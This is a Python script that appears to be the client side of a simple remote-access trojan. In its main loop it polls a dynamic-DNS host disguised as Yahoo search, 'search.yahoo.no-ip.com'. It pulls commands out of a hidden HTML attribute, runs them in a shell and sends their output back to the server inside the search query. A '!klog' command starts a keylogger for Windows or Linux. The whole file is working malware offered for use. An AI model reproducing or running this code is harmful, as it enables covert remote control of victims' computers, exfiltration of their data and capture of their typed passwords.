#!/bin/sh

import os
import sys
import urllib
import bs4
import subprocess
import time
import datetime
import platform

import webserver

#print ("Test3")

#webserver.run(port=80)

#query = "test3"
#response = urllib.urlopen('http://search.yahoo.com/search?p=%s' % query).read()
#print response


def klogger():
    isWindows = False
    isLinux = False
    isMac = False

    try:
        os_name = os.name
        platform_name = platform.system()

        if os_name.lower () =='posix':
            if platform_name.lower() == 'linux':
                isLinux = True
            if platform_name.lower() == 'darwin':
                isMac = True
        if os_name.lower () =='nt' or platform_name.lower() == 'windows':
            isWindows = True

        if isWindows:
            # https://geekviews.tech/how-to-make-a-simple-and-powerfull-python-keylogger/
            import pyHook, pythoncom, sys, logging

            file_log = 'F:\\test\\log.txt'

            def onKeyboardEvent(event):
                logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
                chr(event.Ascii)
                logging.log(10, chr(event.Ascii))
                return True

            hooks_manager = pyHook.HookManager()

            hooks_manager.KeyDown = onKeyboardEvent

            hooks_manager.HookKeyboard()

            pythoncom.PumpMessages()

        if isLinux:
            # http://www.techinfected.net/2015/10/how-to-make-simple-basic-keylogger-in-python-for-linux.html
            import pyxhook
            # change this to your log file's path
            log_file = '/home/aman/Desktop/file.log'

            # this function is called everytime a key is pressed.
            def OnKeyPress(event):
                fob = open(log_file, 'a')
                fob.write(event.Key)
                fob.write('\n')

                if event.Ascii == 96:  # 96 is the ascii value of the grave key (`)
                    fob.close()
                    new_hook.cancel()

            # instantiate HookManager class
            new_hook = pyxhook.HookManager()
            # listen to all keystrokes
            new_hook.KeyDown = OnKeyPress
            # hook the keyboard
            new_hook.HookKeyboard()
            # start the session
            new_hook.start()
    except Exception as e:
        mess = e.message


def execute_cmd(cmd):
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    tmp = proc.stdout.read()
    return tmp

def main(argv):
    print 'Client'

    query = "test3"
    server_domain = 'search.yahoo.no-ip.com'

    # cmd = 'dir'
    # query = execute_cmd(cmd)
    # print query
    #
    # cmd = 'ping search.yahoo.no-ip.com'
    # query = execute_cmd(cmd)
    # print query

    query = 'cnn highligts'
    cmd = ''
    while cmd != '!off':
        try:
            #response = urllib.urlopen('http://search.yahoo.com/search?p=%s' % query).read()
            response = urllib.urlopen('http://%s/search?p=%s' % (server_domain, query)).read()
            print response

            soup = bs4.BeautifulSoup(response)
            cc = soup.find(attrs={"property": "oq:yahoo_search_engine"})
            cmd = cc.attrs['xcontent']

            print cmd

            if cmd == '!klog':
                klogger()
            else:
                query = execute_cmd(cmd)
        except Exception as e:
            mess = e.message
            pass
        print query
        now = datetime.datetime.now()
        print now
        time.sleep(5)



if __name__ == "__main__":
    main(sys.argv)
